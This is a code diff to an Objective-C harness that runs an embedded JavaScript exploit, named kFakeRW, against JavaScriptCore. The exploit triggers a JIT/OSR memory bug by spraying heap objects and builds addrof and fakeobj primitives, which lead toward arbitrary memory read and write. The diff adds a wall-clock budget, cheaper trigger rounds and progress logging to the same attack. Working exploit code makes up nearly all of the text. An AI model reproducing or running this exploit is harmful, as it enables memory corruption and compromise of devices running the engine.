@@ -31,6 +31,7 @@ static const char *kFakeRW = R"JS(
   var ab = new ArrayBuffer(8), u = new BigUint64Array(ab), d = new Float64Array(ab);
   var itof = function (v) { u[0] = v; return d[0]; };
   var ftoi = function (f) { d[0] = f; return u[0]; };
+  var BUDGET = 150000, t0 = Date.now(), rounds = 0;
   var host = {};
   for (var i = 0; i < 32; i++) host['qz' + i] = 1.1;
   arr = new Array(0x400000).fill(1.1);
@@ -54,7 +55,12 @@ static const char *kFakeRW = R"JS(
   for (let i = 0; i < 10000; i++) rec(i);
   var W = null;
   for (let k = 0; k < 10000 && !W; ++k) {
-    foo(false, 10, k % 5 + 1); rec(10000);
+    rounds = k + 1;
+    // OSR cost: full inner loops while foo/rec tier up, then a much cheaper
+    // variant so more rounds fit into the wall-clock budget (the first version
+    // burned ~60M JS calls per round and never returned a verdict).
+    var kk = (k < 30) ? 10 : 2;
+    foo(false, kk, k % 5 + 1); rec(2000);
     for (let i = 0; i < 3; ++i) new ArrayBuffer(0x4000);
     let fr = arr[arr_index].p1.p1;
     let noCow = 13.37;
@@ -62,8 +68,14 @@ static const char *kFakeRW = R"JS(
       let c = [13.37, 2.2, 3.3, 4.4, noCow];
       if (fr[0] === 13.37) { W = { freed: fr, boxed: c }; break; }
     }
+    if (k % 25 === 24) aveStep('hunt round=' + rounds +
+                               ' elapsed=' + (Date.now() - t0) + 'ms trigger=no');
+    if (Date.now() - t0 > BUDGET) break;
   }
-  if (!W) return JSON.stringify({ err: 'trigger did not fire' });
+  out.rounds = rounds; out.huntMs = Date.now() - t0;
+  aveStep('hunt finished: rounds=' + rounds + ' in ' + out.huntMs + 'ms');
+  if (!W) return JSON.stringify({ err: 'trigger did not fire',
+                                  rounds: rounds, huntMs: out.huntMs });
   function addrof(o) { W.boxed[0] = o; return ftoi(W.freed[0]); }
   function fakeobj(a) { W.freed[0] = itof(a); return W.boxed[0]; }
 
@@ -112,9 +124,15 @@ static const char *kFakeRW = R"JS(
 )JS";
 
 static NSString *RunJS(const char *js, int timeoutSec) {
+    (void)timeoutSec;
     @autoreleasepool {
         JSContext *ctx = [[JSContext alloc] init];
         NSString *res = @"(no answer)";
+        ctx[@"aveStep"] = ^(id s) {
+            NSString *line = [s isKindOfClass:[NSString class]] ? s : [s description] ?: @"?";
+            AveLog([NSString stringWithFormat:@"    js. %@", line]);
+            AvePost([NSString stringWithFormat:@"FAKERW STEP %@", line]);
+        };
         @try {
             JSValue *v = [ctx evaluateScript:[NSString stringWithUTF8String:js]];
             if ([ctx exception]) res = [[ctx exception] toString] ?: @"js exception";
